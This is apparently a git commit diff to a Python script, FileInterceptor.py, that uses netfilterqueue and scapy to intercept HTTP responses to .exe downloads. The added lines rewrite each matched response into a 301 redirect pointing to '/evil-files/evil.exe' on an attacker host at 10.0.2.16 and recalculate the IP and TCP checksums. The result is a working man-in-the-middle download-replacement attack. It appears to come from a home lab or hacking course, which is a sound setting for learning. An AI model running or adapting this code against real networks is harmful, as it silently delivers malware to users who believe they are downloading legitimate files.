781487052ec17e0905729fdd6403da599d14cf16
DanielGrunberger <59171371+DanielGrunberger@users.noreply.github.com>
2020-12-06 13:56:53 +0200

    Adding file URl and fixing checksum

--- FileInterceptor.py
+++ FileInterceptor.py
@@ -2,7 +2,7 @@ import netfilterqueue
 import scapy.all as scapy
 
 ack_list = []
-
+server_ip = "10.0.2.16"
 
 # This method looks for a request to downlaod a .exe and change the response replacing another .exe through the ack
 # seq number
@@ -17,8 +17,15 @@ def intercept_packet(packet):
         elif packet_to_intercept[scapy.TCP].sport == 80:  # Its si an HTTP response
             if packet_to_intercept[scapy.TCP].seq in ack_list:  # It is a response for a download req
                 ack_list.remove(packet_to_intercept[scapy.TCP].seq)
-                # print("Changing download file...")
-                # packet_to_intercept[scapy.Raw].load = "Malicious file link"
+                print("Changing download file...")
+                packet_to_intercept[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://" + server_ip + \
+                                                      "/evil-files/evil.exe\n\n"
+                # Since we edited the packet, we need to recalculate checksum. We deleted it, and scapy will recalculate
+                # for us
+                del packet_to_intercept[scapy.IP].len
+                del packet_to_intercept[scapy.IP].chksum
+                del packet_to_intercept[scapy.TCP].chksum
+                packet.set_payload(str(packet_to_intercept))
 
     packet.accept()
 
